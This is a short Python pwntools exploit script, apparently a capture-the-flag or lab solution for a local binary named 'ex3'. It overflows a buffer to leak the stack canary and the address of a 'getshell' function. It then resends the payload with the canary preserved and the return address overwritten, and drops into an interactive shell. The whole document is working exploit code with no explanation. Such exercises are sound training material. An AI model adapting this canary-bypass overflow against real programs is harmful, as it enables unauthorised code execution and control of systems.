#!/usr/bin/env python

from pwn import *

context.binary = 'ex3'
#context.log_level = 'debug'
io = process('./ex3')

print io.recvuntil("sleeping...\n")

# leak canary
payload = " "*100 + p32(0xdeadbeef)
io.sendline(payload)

print io.recvuntil(payload)
canary = u32(io.recv(4))-0xa
getshell = u32(io.recv(4)) - 0xe9f
log.info("canary:"+hex(canary))
log.info("getshell:"+hex(getshell))

# Bypass canary
payload = payload+p32(canary)+'\x90'*0xc+p32(getshell)
io.send(payload)

print io.recv()

io.interactive()

